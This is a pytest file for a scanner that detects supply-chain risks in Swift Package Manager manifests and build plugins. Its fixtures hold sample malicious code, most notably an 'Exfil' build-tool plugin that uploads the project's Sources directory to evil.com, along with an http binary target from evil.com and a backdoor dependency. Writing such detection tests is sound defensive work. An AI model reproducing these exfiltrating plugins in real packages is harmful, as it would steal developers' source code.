"""Tests for SpmPluginScanner — SPM build plugin supply-chain risks."""

from __future__ import annotations

import asyncio

import pytest

from depfence.scanners.spm_plugin_scanner import SpmPluginScanner


@pytest.fixture
def scanner():
    return SpmPluginScanner()


def run(scanner, project_dir):
    return asyncio.get_event_loop().run_until_complete(scanner.scan_project(project_dir))


class TestBuildToolPlugin:
    def test_build_tool_plugin_detected(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
// swift-tools-version:5.9
import PackageDescription

let package = Package(
    name: "MyApp",
    targets: [
        .plugin(name: "CodeGen", capability: .buildTool()),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm01 = [f for f in findings if f.metadata.get("rule") == "SPM-01"]
        assert len(spm01) == 1
        assert "CodeGen" in spm01[0].title

    def test_no_false_positive_on_regular_target(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyLib",
    targets: [.target(name: "MyLib", dependencies: [])]
)
""")
        findings = run(scanner, tmp_path)
        assert len(findings) == 0


class TestBinaryTarget:
    def test_binary_target_https(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    targets: [
        .binaryTarget(name: "SomeSDK", url: "https://example.com/SomeSDK.xcframework.zip", checksum: "abc123"),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm02 = [f for f in findings if f.metadata.get("rule") == "SPM-02"]
        assert len(spm02) == 1
        assert spm02[0].severity.name == "HIGH"
        assert "SomeSDK" in spm02[0].title

    def test_binary_target_http_is_critical(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    targets: [
        .binaryTarget(name: "BadSDK", url: "http://evil.com/BadSDK.xcframework.zip", checksum: "abc"),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm02 = [f for f in findings if f.metadata.get("rule") == "SPM-02"]
        assert len(spm02) == 1
        assert spm02[0].severity.name == "CRITICAL"


class TestUnsafeFlags:
    def test_unsafe_flags_detected(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    targets: [
        .target(name: "MyLib", swiftSettings: [
            .unsafeFlags(["-Xfrontend", "-enable-experimental-feature"])
        ]),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm03 = [f for f in findings if f.metadata.get("rule") == "SPM-03"]
        assert len(spm03) == 1
        assert "unsafeFlags" in spm03[0].title


class TestMutableDependencies:
    def test_branch_dependency(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    dependencies: [
        .package(url: "https://github.com/org/lib.git", branch: "main"),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm04 = [f for f in findings if f.metadata.get("rule") == "SPM-04"]
        assert len(spm04) == 1
        assert spm04[0].metadata["ref_type"] == "branch"
        assert "lib" in spm04[0].title

    def test_revision_dependency(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    dependencies: [
        .package(url: "https://github.com/org/utils", revision: "abc123"),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm04 = [f for f in findings if f.metadata.get("rule") == "SPM-04"]
        assert len(spm04) == 1
        assert spm04[0].metadata["ref_type"] == "revision"

    def test_range_dependency(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    dependencies: [
        .package(url: "https://github.com/org/range-lib.git", "1.0.0"..."2.0.0"),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm04 = [f for f in findings if f.metadata.get("rule") == "SPM-04"]
        assert len(spm04) == 1
        assert spm04[0].metadata["ref_type"] == "range"

    def test_pinned_version_no_finding(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    dependencies: [
        .package(url: "https://github.com/org/safe-lib.git", from: "1.0.0"),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm04 = [f for f in findings if f.metadata.get("rule") == "SPM-04"]
        assert len(spm04) == 0


class TestCommandPlugin:
    def test_command_plugin_detected(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "MyApp",
    targets: [
        .plugin(name: "FormatCode", capability: .command(intent: .custom(verb: "format", description: "Format"))),
    ]
)
""")
        findings = run(scanner, tmp_path)
        spm05 = [f for f in findings if f.metadata.get("rule") == "SPM-05"]
        assert len(spm05) == 1
        assert "FormatCode" in spm05[0].title


class TestPluginSource:
    def test_process_launch_in_plugin(self, tmp_path, scanner):
        plugins_dir = tmp_path / "Plugins" / "MyPlugin"
        plugins_dir.mkdir(parents=True)
        src = plugins_dir / "Plugin.swift"
        src.write_text("""
import PackagePlugin

@main struct MyPlugin: BuildToolPlugin {
    func createBuildCommands(context: PluginContext, target: Target) throws -> [Command] {
        let proc = Process()
        proc.executableURL = URL(fileURLWithPath: "/usr/bin/curl")
        try proc.run()
        return []
    }
}
""")
        findings = run(scanner, tmp_path)
        process_findings = [f for f in findings if "Process execution" in f.title]
        assert len(process_findings) == 1

    def test_network_access_in_plugin(self, tmp_path, scanner):
        plugins_dir = tmp_path / "Plugins" / "Exfil"
        plugins_dir.mkdir(parents=True)
        src = plugins_dir / "Plugin.swift"
        src.write_text("""
import Foundation
import PackagePlugin

@main struct Exfil: BuildToolPlugin {
    func createBuildCommands(context: PluginContext, target: Target) throws -> [Command] {
        let url = URL(string: "https://evil.com/steal")!
        let data = try Data(contentsOf: context.package.directory.appending("Sources"))
        URLSession.shared.uploadTask(with: URLRequest(url: url), from: data).resume()
        return []
    }
}
""")
        findings = run(scanner, tmp_path)
        net_findings = [f for f in findings if "Network access" in f.title]
        assert len(net_findings) == 1
        assert net_findings[0].severity.name == "CRITICAL"

    def test_clean_plugin_no_finding(self, tmp_path, scanner):
        plugins_dir = tmp_path / "Plugins" / "SafePlugin"
        plugins_dir.mkdir(parents=True)
        src = plugins_dir / "Plugin.swift"
        src.write_text("""
import PackagePlugin

@main struct SafePlugin: BuildToolPlugin {
    func createBuildCommands(context: PluginContext, target: Target) throws -> [Command] {
        return [.buildCommand(displayName: "Generate", executable: .init("tool"), arguments: [])]
    }
}
""")
        findings = run(scanner, tmp_path)
        assert len(findings) == 0


class TestMultipleFindings:
    def test_kitchen_sink_manifest(self, tmp_path, scanner):
        pkg = tmp_path / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "Malicious",
    dependencies: [
        .package(url: "https://github.com/evil/backdoor.git", branch: "main"),
    ],
    targets: [
        .plugin(name: "Inject", capability: .buildTool()),
        .binaryTarget(name: "Payload", url: "http://evil.com/payload.xcframework.zip", checksum: "deadbeef"),
        .target(name: "Core", swiftSettings: [.unsafeFlags(["-Xcc", "-DBACKDOOR"])]),
    ]
)
""")
        findings = run(scanner, tmp_path)
        rules = {f.metadata.get("rule") for f in findings}
        assert "SPM-01" in rules
        assert "SPM-02" in rules
        assert "SPM-03" in rules
        assert "SPM-04" in rules


class TestSkipDirs:
    def test_build_dir_skipped(self, tmp_path, scanner):
        build_dir = tmp_path / ".build" / "checkouts" / "dep"
        build_dir.mkdir(parents=True)
        pkg = build_dir / "Package.swift"
        pkg.write_text("""
import PackageDescription
let package = Package(
    name: "Dep",
    targets: [.plugin(name: "Evil", capability: .buildTool())]
)
""")
        findings = run(scanner, tmp_path)
        assert len(findings) == 0
